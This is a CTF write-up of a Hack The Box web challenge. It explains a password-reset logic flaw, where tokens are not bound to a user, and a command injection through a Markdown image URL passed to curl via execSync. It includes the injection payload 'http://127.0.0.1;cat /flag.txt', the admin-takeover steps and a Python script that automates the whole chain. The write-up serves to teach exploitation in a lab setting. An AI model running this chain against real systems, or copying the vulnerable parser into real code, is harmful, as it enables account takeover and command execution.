---
date:
  created: 2025-08-06
categories:
  - CTF Writeup
  - Hackthebox
  - Web Application Penetration Testing
  - Command Injection
authors:
  - dibsy
---

# Logical Bug + Command Injection = Flag

### Summary

The application was vulnerable to a logical flaw in the password reset mechanism that allowed unauthorized password resets. By exploiting this flaw, we reset the **admin** user's password. This privilege escalation allowed access to an admin-only weapon dispatch feature, which included a command injection vulnerability via unsanitized `curl` execution in Markdown parsing. Combining both vulnerabilities led to command execution and flag retrieval.

<!-- more -->

### Part 1: Logical Flaw in Password Reset

The `/reset-password` endpoint takes a token, new password, and email:

```js
router.post("/reset-password", async (req, res) => {
  const { token, newPassword, email } = req.body;
  if (!token || !newPassword || !email)
    return res.status(400).send("Token, email, and new password are required.");

  try {
    const reset = await getPasswordReset(token);
    if (!reset) return res.status(400).send("Invalid or expired token.");

    const user = await getUserByEmail(email);
    if (!user) return res.status(404).send("User not found.");

    await updateUserPassword(user.id, newPassword);
    await deletePasswordReset(token);

    res.send("Password reset successful.");
  } catch (err) {
    console.error("Error resetting password:", err);
    res.status(500).send("Error resetting password.");
  }
});
```

And the `getPasswordReset()` logic:

```js
async function getPasswordReset(token) {
  const query = `SELECT * FROM password_resets WHERE token = ? AND expires_at > ?`;
  const reset = await get(query, [token, Date.now()]);
  return reset;
}
```

🚨 **Vulnerability:** The reset token is **not linked to any user**. Any valid token in the table can be used to reset the password of **any user** by supplying a matching email.

### Exploitation Steps

1. Register a user with your own email.
2. Request a password reset — get your token.
3. Discover admin email: `admin@armaxis.htb` (from source code).
4. Submit the token and set a new password for the admin:
    ```json
    {
      "token": "<your_token>",
      "newPassword": "newadmin123",
      "email": "admin@armaxis.htb"
    }
    ```

✅ You can now log in as admin.

---

### Part 2: Command Injection in Markdown Image Parser

The `/weapons/dispatch` route is **admin-only**, and takes a Markdown `note`:

```js
router.post("/weapons/dispatch", authenticate, async (req, res) => {
  const { role } = req.user;
  if (role !== "admin") return res.status(403).send("Access denied.");

  const parsedNote = parseMarkdown(note);
  await dispatchWeapon(name, price, parsedNote, dispatched_to);

  res.send("Weapon dispatched successfully.");
});
```

#### Vulnerable Markdown Parser

```js
function parseMarkdown(content) {
  if (!content) return '';
  return md.render(
    content.replace(/\!\[.*?\]\((.*?)\)/g, (match, url) => {
      try {
        const fileContent = execSync(`curl -s ${url}`);
        const base64Content = Buffer.from(fileContent).toString('base64');
        return `<img src="data:image/*;base64,${base64Content}" alt="Embedded Image">`;
      } catch (err) {
        return `<p>Error loading image: ${url}</p>`;
      }
    })
  );
}
```

🚨 **Vulnerability:** The URL inside Markdown image `![alt](url)` is passed **unsanitized** to `curl`, leading to **command injection**.

---

### Exploiting the Vulnerability

To read `/flag.txt`, we inject a command in the image markdown:

```json
{
  "name": "a",
  "price": 1,
  "note": "![logo](http://127.0.0.1;cat /flag.txt)",
  "dispatched_to": "admin@armaxis.htb"
}
```

✅ The result of the `cat /flag.txt` command gets embedded in the `src` of the generated image as base64.

You can decode it to get the flag:

```
<img src="data:image/*;base64,SE...==" />
```

Which gives:

```
HTB{m4rkd0wn.........}
```

---

### Conclusion

Two chained vulnerabilities:

- A **logic flaw** in the password reset flow.
- A **command injection** via image Markdown processing.

Together, they allowed privilege escalation and remote command execution, leading to full compromise of the application.

### Automation
```python
import requests
import random
import string
from bs4 import BeautifulSoup
import re
import base64

def generate_random_string(length=12):
    chars = string.ascii_letters + string.digits
    return ''.join(random.choices(chars, k=6))

email = "test@email.htb"
username = generate_random_string()
password = generate_random_string()

proxies = {
    "http":"127.0.0.1:8080"
}

target = "http://83.136.248.112:41163"
target_mail = "http://83.136.248.112:35824/"
#target = "http://83.136.248.112:32701/"

json_data = {
    "email": email,
    "password": password
}

print(f"Registering with {email}:{password}")
req = requests.post(target+"/register", json=json_data)
print(req.text)

print(f"Requesting a new reset token for the {email}")
req = requests.post(target+"/reset-password/request",json={"email":email})
print(req.text)

print(f"Capturing a token from the mail")
req = requests.get(target_mail)
soup = BeautifulSoup(req.text,'html.parser')
tds = soup.find_all('td')

tokens = []

for td in tds:
    match = re.search(r'\b[a-f0-9]{32}\b',td.text)
    if match:
        token = match.group()
        print(token)
        tokens.append(token)

admin_email = "admin@armaxis.htb"
print(f"Requesting a password reset for {admin_email}")
req = requests.post(target+"/reset-password/request",json={"email":admin_email})
print(req.text)

new_password = generate_random_string()

print(f"Running a password reset for {admin_email} with a new password {new_password}")

for token in tokens:
    req = requests.post(target+"/reset-password/",json={"token":token,"newPassword":new_password,"email":admin_email},proxies=proxies)
    if not "Invalid" in req.text:
        break

print(f"Logging in as admin")
sess = requests.Session()
req = sess.post(target+"/login",json={"email":admin_email,"password":new_password},proxies=proxies)
print(req.text)

print(f"Injecting commands into the /weapons/dispatch")
req = sess.post(target+"/weapons/dispatch",json={"name":"xyz","price":1,"note":"![logo](http://127.0.0.1;cat /flag.txt)","dispatched_to":"admin@armaxis.htb"},proxies=proxies)

print(f"Fetching the flag")
req = sess.get(target+"/weapons")
soup = BeautifulSoup(req.text,'html.parser')
img_tags = soup.find_all('img')
for img_tag in img_tags:
    src = img_tag.get("src","")
    match = re.match(r"^data:image/[^;]+;base64,(.*)", src)
    if match:
        base64_data = match.group(1)
        try:
            temp = base64.b64decode(base64_data)
            print(temp.decode().strip())
        except:
            pass
```
